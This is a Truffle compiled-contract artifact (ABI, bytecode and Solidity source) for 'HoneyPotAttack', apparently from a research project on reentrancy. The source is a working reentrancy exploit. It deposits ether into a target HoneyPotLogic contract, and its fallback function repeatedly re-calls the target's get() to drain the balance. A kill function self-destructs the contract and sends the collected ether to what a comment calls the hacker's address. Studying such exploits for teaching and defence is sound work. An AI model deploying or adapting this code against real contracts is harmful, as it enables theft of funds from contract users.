{
  "contractName": "HoneyPotAttack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "honeyPotLogic",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_honeyPotLogic",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getOwner",
      "outputs": [
        {
          "name": "__owner",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "killAddress",
          "type": "address"
        }
      ],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "maxIterations",
          "type": "uint256"
        }
      ],
      "name": "collect",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "withdrawAddress",
          "type": "address"
        },
        {
          "name": "withdrawAmount",
          "type": "uint256"
        }
      ],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806108d08339810180604052602081101561003057600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506107fe806100d26000396000f3fe60806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063893d20e81461016d578063bcfc3f91146101c4578063cbf0b0c01461021b578063ce3f865f1461026c578063f3fef3a31461029a575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101580156100b85750600254600154105b1561016b57600180600082825401925050819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561015257600080fd5b505af1158015610166573d6000803e3d6000fd5b505050505b005b34801561017957600080fd5b506101826102f5565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101d057600080fd5b506101d961031f565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561022757600080fd5b5061026a6004803603602081101561023e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610344565b005b6102986004803603602081101561028257600080fd5b8101908080359060200190929190505050610422565b005b3480156102a657600080fd5b506102f3600480360360408110156102bd57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610634565b005b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610409576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16ff5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156104e7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b6000600181905550806002819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663549262ba346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561057b57600080fd5b505af115801561058f573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561061957600080fd5b505af115801561062d573d6000803e3d6000fd5b5050505050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156106f9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b803073ffffffffffffffffffffffffffffffffffffffff1631111515610787576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260108152602001807f6e6f7420656e6f7567682066756e64730000000000000000000000000000000081525060200191505060405180910390fd5b8173ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501580156107cd573d6000803e3d6000fd5b50505056fea165627a7a72305820553bc1c9971acd8b7912c9122e1f3ee0f426a0a9b3634551c8633c85aff9013d0029",
  "source": "pragma solidity ^0.5.0;\r\n\r\nimport \"./HoneyPotLogic.sol\";\r\n// import \"openzeppelin-solidity/contracts/ownership/Ownable.sol\";\r\n\r\ncontract HoneyPotAttack {\r\n  HoneyPotLogic public honeyPotLogic;\r\n  uint256 private _iteration;\r\n  uint256 private _maxIterations;\r\n  address private _owner;\r\n  constructor (address payable _honeyPotLogic) public {\r\n    // pass an address will be the honeyPotLogic\r\n    honeyPotLogic = HoneyPotLogic(_honeyPotLogic);\r\n    _owner = msg.sender;\r\n  }\r\n\r\n  function getOwner() public view returns (address __owner) {\r\n    __owner = _owner;\r\n  }\r\n\r\n  /**\r\n    * @dev Throws if called by any account other than the owner.\r\n    */\r\n  modifier onlyOwner() {\r\n      require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n      _;\r\n  }\r\n\r\n  // to get the collected ether to an address of hacker\r\n  // mechanism to destroy the honeyPotLogicCollect and send all ether containing in it to the address\r\n  function kill (address payable killAddress) public onlyOwner {\r\n    selfdestruct(killAddress);\r\n  }\r\n\r\n\r\n  // set the reentrancy attack in motion. It puts some ether in honeyPotLogic\r\n  function collect(uint256 maxIterations) payable public onlyOwner {\r\n    _iteration = 0;\r\n    _maxIterations = maxIterations;\r\n\r\n    honeyPotLogic.put.value(msg.value)();\r\n    honeyPotLogic.get();\r\n  }\r\n\r\n  function withdraw(address payable withdrawAddress, uint256 withdrawAmount)\r\n  public onlyOwner\r\n  {\r\n      require(address(this).balance > withdrawAmount, \"not enough funds\");\r\n\r\n      withdrawAddress.transfer(withdrawAmount);\r\n  }\r\n  // the fallback function is called whenever the honeyPotLogicCollect contract receives ether\r\n  function () payable external {\r\n    if (address(honeyPotLogic).balance >= msg.value && _iteration < _maxIterations) \r\n        {\r\n            _iteration += 1;\r\n\r\n            honeyPotLogic.get();\r\n        }\r\n  }\r\n}\r\n",
  "sourcePath": "D:/Projects/research/truffle/reentrancy-acttack/contracts/HoneyPotAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.0.6",
  "updatedAt": "2019-05-09T05:03:35.425Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}